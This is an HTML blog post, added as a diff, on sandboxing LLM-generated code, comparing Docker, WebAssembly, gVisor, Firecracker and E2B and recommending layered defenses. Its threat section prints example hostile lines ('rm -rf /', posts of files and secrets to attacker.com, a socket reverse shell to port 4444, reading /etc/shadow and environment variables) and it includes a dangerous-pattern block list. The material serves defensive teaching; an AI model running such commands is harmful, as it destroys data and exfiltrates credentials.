@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Docker, WebAssembly, Firecracker, and E2B. How to execute code your LLM generated without burning down your infrastructure.">
+  <meta name="author" content="Shibin">
+  <title>Sandboxing LLM-Generated Code: Running Untrusted AI Code Safely</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+      line-height: 1.6;
+      max-width: 800px;
+      margin: 0 auto;
+      padding: 20px;
+      color: #333;
+    }
+    h1 { color: #2c3e50; margin-bottom: 10px; }
+    .meta { color: #7f8c8d; margin-bottom: 20px; font-size: 14px; }
+    .tags { margin: 20px 0; }
+    .tag {
+      display: inline-block;
+      background: #ecf0f1;
+      padding: 5px 10px;
+      margin-right: 5px;
+      border-radius: 3px;
+      font-size: 12px;
+    }
+    img { max-width: 100%; height: auto; }
+    code {
+      background: #f4f4f4;
+      padding: 2px 6px;
+      border-radius: 3px;
+      font-family: 'Courier New', monospace;
+    }
+  </style>
+</head>
+<body>
+  <article>
+    <h1>Sandboxing LLM-Generated Code: Running Untrusted AI Code Safely</h1>
+    <div class="meta">
+      <span>By Shibin</span> •
+      <span>2026-02-13</span>
+    </div>
+    <div class="tags">
+        <span class="tag">Security</span><span class="tag">AI</span><span class="tag">Software Engineering</span><span class="tag">DevOps</span><span class="tag">LLMs</span>
+      </div>
+    <div class="content">
+      <p><h2>The Problem: AI Wrote a Rootkit (Probably Not On Purpose)</h2></p><p>You're building an AI code generation tool. The LLM writes:</p><p>```python</p>
+<p>import os</p>
+<p>os.system("rm -rf /")</p>
+<p>```</p><p>Or maybe it's subtle:</p><p>```python</p>
+<p>import requests</p>
+<p>requests.post("http://attacker.com", data=get_all_files())</p>
+<p>```</p><p>Or it's just a bug:</p><p>```python</p>
+<p>while True:</p>
+<p>    huge_array = [0] * 999999999999</p>
+<p>```</p><p>Your LLM didn't mean to brick your system. It just hallucinates code sometimes. And now you've got a problem: <strong>how do you run code an untrusted source (even if it's trying to be helpful) without it destroying everything?</strong></p><p>This is the sandboxing problem. And in 2026, it's not theoretical anymore. AI agents that execute code, data analysis tools, code generation platforms—they all need to solve this.</p><p>The answer is: <strong>you can't make it 100% safe, but you can make it safe enough.</strong></p><p><h2>Why Should You Care?</h2></p><p><strong>If you're building anything with code execution:</strong></p>
+<p>- Data analysis platform (user asks AI to process CSV and generate charts)</p>
+<p>- Code generation tool (LLM writes code, you run it to test)</p>
+<p>- AI agent that writes and executes scripts</p>
+<p>- Research tool that evaluates AI-generated code</p>
+<p>- Any product where the AI outputs executable code</p><p><strong>If you're running AI-generated code:</strong></p>
+<p>- You're running untrusted code by definition</p>
+<p>- The code might have bugs, backdoors, or unintended side effects</p>
+<p>- A single exploit can compromise your entire system</p>
+<p>- Your users are trusting you to contain the damage</p><p><strong>The industry is waking up to this.</strong> GitHub Copilot must consider code execution safety. LangChain is building sandboxing into their framework. E2B raised $30M to commercialize code sandboxing. Google, OpenAI, and Anthropic all have teams focused on this problem.</p><p>This isn't optional anymore. It's required infrastructure.</p><p><h2>Part 1: Understanding the Threat</h2></p><p><h3>Threat 1: Resource Exhaustion</h3></p><p>The LLM generates code that:</p>
+<p>- Consumes infinite memory (infinite loops, huge arrays)</p>
+<p>- Max out CPU (cryptographic operations, tight loops)</p>
+<p>- Fill disk space (writing massive files)</p><p>Result: Your server crashes. Your other users can't run their code.</p><p><h3>Threat 2: Side Channel Access</h3></p><p>The code reads files it shouldn't:</p><p>```python</p>
+<p>with open("/etc/shadow", "r") as f:</p>
+<p>    passwords = f.read()</p>
+<p>```</p><p>Or accesses environment variables:</p><p>```python</p>
+<p>import os</p>
+<p>print(os.environ)  # AWS_SECRET_ACCESS_KEY, DATABASE_PASSWORD, etc.</p>
+<p>```</p><p>Result: Credentials leaked. Your database is compromised.</p><p><h3>Threat 3: Network Exploitation</h3></p><p>The code phones home:</p><p>```python</p>
+<p>import socket</p>
+<p>socket.socket().connect(("attacker.com", 4444))</p>
+<p><h1>Now attacker has reverse shell on your server</h1></p>
+<p>```</p><p>Or exfiltrates data:</p><p>```python</p>
+<p>requests.post("http://attacker.com/steal", json={"data": secret_data})</p>
+<p>```</p><p>Result: Your infrastructure is pwned. Your users' data is stolen.</p><p><h3>Threat 4: Host Escape</h3></p><p>The code breaks out of sandboxing and reaches the host:</p><p>```bash</p>
+<p><h1>Run arbitrary commands on the host</h1></p>
+<p>docker run -it ubuntu /bin/bash</p>
+<p>```</p><p>Result: Game over. The sandbox is useless.</p><p><h3>Threat 5: Side-Channel Attacks</h3></p><p>The code doesn't exfiltrate data directly. Instead, it:</p>
+<p>- Measures timing to infer secrets</p>
+<p>- Uses covert channels (disk I/O patterns, memory access)</p>
+<p>- Probes CPU caches to leak data</p><p>Result: Data leak that's nearly impossible to detect.</p><p>![Mermaid Diagram](https://raw.githubusercontent.com/thousandmiles-ai/blogs/main/blog-images/sandboxing-llm-generated-code-running-untrusted-ai-code-safely/mermaid-87b53519fb6cdc09ab722bc2da19a285.svg)</p><p><h2>Part 2: Sandbox Options (Tradeoffs)</h2></p><p><h3>Option 1: Docker Containers</h3></p><p><strong>The Idea:</strong> Run the code in a Docker container with limited resources and filesystem access.</p><p>```dockerfile</p>
+<p>FROM python:3.11-slim</p><p>WORKDIR /sandbox</p>
+<p>COPY user_code.py .</p><p>CMD ["python", "user_code.py"]</p>
+<p>```</p><p>Run with restrictions:</p><p>```bash</p>
+<p>docker run \</p>
+<p>  --rm \</p>
+<p>  --cpus="0.5" \</p>
+<p>  --memory="512m" \</p>
+<p>  --read-only \</p>
+<p>  --tmpfs /tmp:size=100m \</p>
+<p>  -v /sandbox/input:/input:ro \</p>
+<p>  sandbox-image</p>
+<p>```</p><p><strong>Pros:</strong></p>
+<p>- Easy to set up</p>
+<p>- Good resource limits</p>
+<p>- Familiar technology</p>
+<p>- Widely understood</p><p><strong>Cons:</strong></p>
+<p>- Container escape is possible (though difficult)</p>
+<p>- Startup time: 100-500ms (slow for latency-critical apps)</p>
+<p>- Storage overhead: each container is hundreds of MB</p>
+<p>- Still has access to network by default</p>
+<p>- Side-channel attacks still possible within container</p><p><strong>When to use:</strong> Batch processing, non-sensitive code, when 100ms startup time is acceptable.</p><p><h3>Option 2: WebAssembly (WASM)</h3></p><p><strong>The Idea:</strong> Compile code to WebAssembly, run in a WASM runtime. WASM is sandboxed by design—it has no direct OS access.</p><p>```python</p>
+<p><h1>Python code → compile to WASM → execute in isolated runtime</h1></p>
+<p><h1>User writes Python. Tool converts to WASM.</h1></p>
+<p><h1>WASM has zero access to: filesystem, network, environment</h1></p><p><h1>What the code CAN do:</h1></p>
+<p>- math operations</p>
+<p>- string manipulation</p>
+<p>- data processing</p>
+<p>- call whitelisted functions</p><p><h1>What it CANNOT do:</h1></p>
+<p>- read files</p>
+<p>- make network requests</p>
+<p>- access environment</p>
+<p>- fork processes</p>
+<p>- allocate infinite memory</p>
+<p>```</p><p><strong>Pros:</strong></p>
+<p>- True isolation (memory-safe by design)</p>
+<p>- Super fast startup: under 5ms</p>
+<p>- Minimal overhead: single WASM instance</p>
+<p>- Fine-grained access control (what functions can code call?)</p>
+<p>- Perfect for data processing, transformations</p><p><strong>Cons:</strong></p>
+<p>- No direct filesystem access (must be provided by host)</p>
+<p>- No native libraries (limited to pure code)</p>
+<p>- Fewer language options (Python support is experimental)</p>
+<p>- Not great for I/O-heavy workloads</p><p><strong>When to use:</strong> Data transformation, mathematical operations, code that doesn't need filesystem. The future of safe code execution.</p><p><h3>Option 3: gVisor (Google's Secure Container Runtime)</h3></p><p><strong>The Idea:</strong> Run containers, but intercept all system calls and execute them in user-space. Dramatically reduces attack surface.</p><p>Regular container: code → Linux kernel (one escape away)</p><p>gVisor: code → user-space OS emulation → Linux kernel (much safer)</p><p><strong>Pros:</strong></p>
+<p>- Much harder to escape than plain containers</p>
+<p>- Faster than VMs, slower than bare containers</p>
+<p>- Good for defense in depth</p><p><strong>Cons:</strong></p>
+<p>- Slightly slower (20-30% overhead)</p>
+<p>- More complex to set up</p>
+<p>- Still not unhackable (nothing is)</p><p><strong>When to use:</strong> When you need container familiarity but more security than standard Docker.</p><p><h3>Option 4: Firecracker (AWS's MicroVM)</h3></p><p><strong>The Idea:</strong> Lightweight virtual machines. Each code execution gets its own kernel, filesystem, etc.</p><p>```bash</p>
+<p><h1>One-liner: spin up a full isolated kernel in 125ms</h1></p>
+<p>firecracker --config config.json</p>
+<p>```</p><p><strong>Pros:</strong></p>
+<p>- True isolation (separate kernel)</p>
+<p>- Very fast: 125ms boot time</p>
+<p>- Can run full programs, multiple processes</p>
+<p>- Strong security boundary</p><p><strong>Cons:</strong></p>
+<p>- Heavier than WASM, lighter than Docker</p>
+<p>- Requires more infrastructure knowledge</p>
+<p>- Memory per instance: ~20MB</p><p><strong>When to use:</strong> When you need real isolation but still want the flexibility of a full OS.</p><p><h3>Option 5: E2B (Managed Sandbox-as-a-Service)</h3></p><p><strong>The Idea:</strong> Don't build sandboxing yourself. Use E2B, a platform designed for AI-generated code execution.</p><p>```python</p>
+<p>from e2b import Sandbox</p><p>sandbox = Sandbox()</p>
+<p>result = sandbox.run_code("python", """</p>
+<p>    print('Hello from sandbox!')</p>
+<p>    with open('/tmp/test.txt', 'w') as f:</p>
+<p>        f.write('data')</p>
+<p>""")</p>
+<p>```</p><p><strong>Pros:</strong></p>
+<p>- Managed for you (you don't handle infrastructure)</p>
+<p>- Built specifically for AI use cases</p>
+<p>- Good resource limits, monitoring, isolation</p>
+<p>- Fast iterations</p><p><strong>Cons:</strong></p>
+<p>- Cost per execution (fine for most use cases)</p>
+<p>- Vendor lock-in (but worth it for early stage)</p>
+<p>- Not for ultra-high-volume workloads</p><p><strong>When to use:</strong> If you're a startup or building an AI feature and don't want to manage infrastructure.</p><p><h2>Part 3: Layered Sandboxing (Defense in Depth)</h2></p><p>The smartest approach isn't a single sandbox. It's <strong>layers</strong>.</p><p>![Mermaid Diagram](https://raw.githubusercontent.com/thousandmiles-ai/blogs/main/blog-images/sandboxing-llm-generated-code-running-untrusted-ai-code-safely/mermaid-d001024da32ac1dcc52d8cf1f857fa10.svg)</p><p><h3>Layer 1: Input Validation</h3></p><p>Scan the code before executing:</p><p>```python</p>
+<p>def is_code_safe(code: str) -> bool:</p>
+<p>    dangerous_patterns = [</p>
+<p>        "os.system",</p>
+<p>        "subprocess",</p>
+<p>        "__import__",</p>
+<p>        "open(",</p>
+<p>        "socket",</p>
+<p>        "requests.post",</p>
+<p>        "eval",</p>
+<p>        "exec"</p>
+<p>    ]</p><p>    for pattern in dangerous_patterns:</p>
+<p>        if pattern in code:</p>
+<p>            return False</p><p>    return True</p>
+<p>```</p><p>This won't catch everything (attackers can obfuscate), but it catches obvious stuff.</p><p><h3>Layer 2: Static Analysis</h3></p><p>Use tools like Bandit (for Python) to analyze code AST:</p><p>```bash</p>
+<p>bandit -r user_code.py</p>
+<p>```</p><p>Detects things like:</p>
+<p>- Hardcoded credentials</p>
+<p>- Unsafe deserialization</p>
+<p>- SQL injection patterns</p>
+<p>- Command injection</p><p><h3>Layer 3: Process Isolation</h3></p><p>Run the code in a sandbox (WASM, container, or both).</p><p><h3>Layer 4: Resource Limits</h3></p><p>Set hard limits:</p><p>```python</p>
+<p>import resource</p><p><h1>Max CPU: 5 seconds</h1></p>
+<p>resource.setrlimit(resource.RLIMIT_CPU, (5, 5))</p><p><h1>Max memory: 512MB</h1></p>
+<p>resource.setrlimit(resource.RLIMIT_AS, (512 <em> 1024 </em> 1024, 512 <em> 1024 </em> 1024))</p><p><h1>Max open files: 10</h1></p>
+<p>resource.setrlimit(resource.RLIMIT_NOFILE, (10, 10))</p><p><h1>Then run user code</h1></p>
+<p>exec(user_code)</p>
+<p>```</p><p><h3>Layer 5: Network Control</h3></p><p>Disable network by default:</p><p>```bash</p>
+<p>docker run \</p>
+<p>  --network=none \</p>
+<p>  sandbox-image</p>
+<p>```</p><p>If the code needs network, whitelist specific endpoints:</p><p>```bash</p>
+<p>docker run \</p>
+<p>  --cap-drop=all \</p>
+<p>  --cap-add=net_raw \</p>
+<p>  -e ALLOWED_HOSTS="api.example.com" \</p>
+<p>  sandbox-image</p>
+<p>```</p><p><h3>Layer 6: Monitoring & Alerting</h3></p><p>Log everything:</p>
+<p>- Code execution started/completed</p>
+<p>- Resource usage peaks</p>
+<p>- Network connections attempted</p>
+<p>- Files accessed</p>
+<p>- Environment variables read</p><p>Alert if:</p>
+<p>- Execution time > 30 seconds</p>
+<p>- Memory usage > limit</p>
+<p>- Unexpected network access</p>
+<p>- File access outside /tmp</p><p><h2>Part 4: Real-World Example</h2></p><p>You're building a data analysis platform. User uploads CSV. AI generates Python code to analyze it:</p><p>```python</p>
+<p>import pandas as pd</p>
+<p>import matplotlib.pyplot as plt</p><p>df = pd.read_csv('data.csv')</p>
+<p>print(df.describe())</p>
+<p>```</p><p>Your architecture:</p><p>1. <strong>User uploads CSV</strong> → stored in `/uploads/{user_id}/data.csv`</p>
+<p>2. <strong>User asks AI to analyze</strong> → LLM generates Python code</p>
+<p>3. <strong>You validate code</strong> → Check for dangerous patterns</p>
+<p>4. <strong>Spin up sandbox</strong> → WASM or Docker with limits</p>
+<p>5. <strong>Mount CSV as read-only</strong> → `/data/data.csv` (read-only)</p>
+<p>6. <strong>Mount empty tmpfs</strong> → `/tmp` (write-only, 100MB limit)</p>
+<p>7. <strong>Run code</strong>:</p>
+<p>   ```python</p>
+<p>   import pandas as pd</p><p>   # Code runs here</p>
+<p>   # Can read /data/data.csv</p>
+<p>   # Can write to /tmp</p>
+<p>   # Cannot access /uploads, network, or env</p>
+<p>   ```</p>
+<p>8. <strong>Collect output</strong> → Charts, tables, generated from /tmp</p>
+<p>9. <strong>Return to user</strong> → Profit</p><p>Attacker tries:</p><p>```python</p>
+<p>import os</p>
+<p>os.system("rm -rf /")  # Fails: os.system not available in WASM</p>
+<p><h1>Or if in container: rm -rf / runs but only affects /tmp</h1></p>
+<p>```</p><p>Result: Attack neutralized.</p><p><h2>Common Mistakes</h2></p><p><strong>Mistake 1: Assuming one layer of defense is enough.</strong></p><p>Docker alone? Container escape is possible. WASM alone? Side channels exist. Use layers.</p><p><strong>Mistake 2: Forgetting about side channels.</strong></p><p>You blocked filesystem and network access. But code can infer data through timing, memory access patterns, CPU cache behavior. This is hard to defend against. Assume some data leakage is possible.</p><p><strong>Mistake 3: Not limiting resources aggressively.</strong></p><p>"256MB memory should be fine." Then the LLM generates a 300MB array allocation. Your server OOM-kills it. Other users lose service.</p><p>Set limits <strong>lower</strong> than you think necessary. 128MB for most workloads. Increase if needed.</p><p><strong>Mistake 4: Allowing network access.</strong></p><p>"The code needs to call an API." So you enable network. Now the code can exfiltrate data.</p><p>Use a proxy, whitelist, or have the host make the API call on behalf of the code.</p><p><strong>Mistake 5: Not monitoring.</strong></p><p>"If something goes wrong, we'll notice." No you won't. Until your infrastructure is on fire.</p><p>Log everything. Alert on anomalies. Use observability tools.</p><p><h2>The Future</h2></p><p>The industry is converging on a few approaches:</p><p>1. <strong>WASM for safety-critical code</strong> — data transformation, mathematical operations</p>
+<p>2. <strong>Lightweight VMs (Firecracker) for flexibility</strong> — full programs that need OS features</p>
+<p>3. <strong>Managed services (E2B) for startups</strong> — pay per execution, don't manage infrastructure</p><p>By 2026, "AI-generated code execution" will have established patterns. You won't invent sandboxing from scratch. You'll use proven tools.</p><p>But <strong>none of them are bulletproof.</strong> The game is making attacks expensive, detectable, and limited in scope.</p><p><h2>Next Steps</h2></p><p>1. <strong>Start with WASM for data processing</strong> — it's the safest, fastest option</p>
+<p>2. <strong>Add input validation</strong> — filter dangerous patterns before execution</p>
+<p>3. <strong>Use E2B or similar if you don't want to manage infra</strong> — seriously, it's worth it</p>
+<p>4. <strong>Layer defenses</strong> — input validation → static analysis → sandbox → resource limits → monitoring</p>
+<p>5. <strong>Test attacks</strong> — actually try to break your sandbox. You'll find gaps.</p>
+<p>6. <strong>Monitor in production</strong> — set up alerts for suspicious patterns</p><p><h2>Sign-Off</h2></p><p>The days of blindly running untrusted code are over. In an era where the code is generated by AI, sandboxing isn't paranoia—it's professional responsibility.</p><p>You're not protecting against sophisticated hackers. You're protecting against bugs in your own infrastructure, hallucinations in the LLM, and the one attacker who figures out your blind spots.</p><p>Build for the worst case. Run everything in a sandbox.</p><p>---</p><p><h2>Further Reading</h2></p><p>- [GitHub - restyler/awesome-sandbox: Awesome Code Sandboxing for AI](https://github.com/restyler/awesome-sandbox)</p>
+<p>- [Secure Boundaries: Understanding LLM Sandbox Environments](https://www.sandgarden.com/learn/llm-sandbox)</p>
+<p>- [Sandboxing Agentic AI Workflows with WebAssembly | NVIDIA Blog](https://developer.nvidia.com/blog/sandboxing-agentic-ai-workflows-with-webassembly/)</p>
+<p>- [Code Sandboxes for LLMs and AI Agents | Amir's Blog](https://amirmalik.net/2025/03/07/code-sandboxes-for-llm-ai-agents)</p>
+<p>- [LangChain's Approach To Sandboxing — Native Isolation vs Docker Containers](https://cobusgreyling.medium.com/langchains-approach-to-sandboxing-native-isolation-vs-docker-containers-746a60b265c1)</p>
+    </div>
+  </article>
+</body>
+</html>
